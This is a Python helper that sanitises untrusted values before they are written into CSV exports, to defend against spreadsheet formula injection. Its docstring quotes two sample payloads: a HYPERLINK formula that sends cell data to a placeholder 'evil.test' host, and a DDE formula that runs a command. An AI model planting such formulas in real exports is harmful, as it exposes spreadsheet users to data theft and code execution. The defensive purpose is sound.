"""One rule for writing an untrusted value into a CSV cell.

A spreadsheet treats a cell beginning with `=`, `+`, `-` or `@` as a FORMULA,
not as text. So a value somebody else typed — an agency manager's full name, a
rejection note, an agent code off a bank's feed — becomes code the moment a
bank admin opens the export in Excel or Sheets:

    =HYPERLINK("https://evil.test?x="&A1, "Click")
    =cmd|'/c calc'!A0

That is a cross-tenant path: the text is entered on one tenant's surface and
executes on another tenant's machine, with none of the API's scoping in the
way, because by then it is a file and not a request.

The fix is the OWASP one: prefix a leading formula character with an
apostrophe, which spreadsheets strip on display and treat as text. Also strips
the leading control characters that let a payload hide behind whitespace.

Used by every CSV this product writes (the bank and manager audit exports and
the allocation-decisions export). One definition, because three copies of a
sanitiser is three chances to forget one — which is how the gap existed.
"""
from __future__ import annotations

#: Excel, LibreOffice and Google Sheets all treat these as starting a formula.
_FORMULA_PREFIXES = ("=", "+", "-", "@")
#: Tab and carriage return are skipped before the prefix is examined, so
#: "\t=HYPERLINK(...)" cannot slip past a naive first-character check.
_LEADING_CONTROL = ("\t", "\r", "\n")


def csv_cell(value: object) -> object:
    """`value`, safe to write into a spreadsheet cell.

    Numbers, booleans, None and anything else non-string pass through
    untouched: they cannot carry a formula and quoting them would change the
    column's type in the reader.
    """
    if not isinstance(value, str):
        return value
    stripped = value.lstrip("".join(_LEADING_CONTROL))
    if stripped.startswith(_FORMULA_PREFIXES):
        # The apostrophe is not part of the data: every spreadsheet strips it
        # on display, and a plain-text reader sees one extra character rather
        # than executing anything.
        return "'" + value
    return value


def csv_row(values) -> list:
    """`csv_cell` across a row, for the common case."""
    return [csv_cell(v) for v in values]
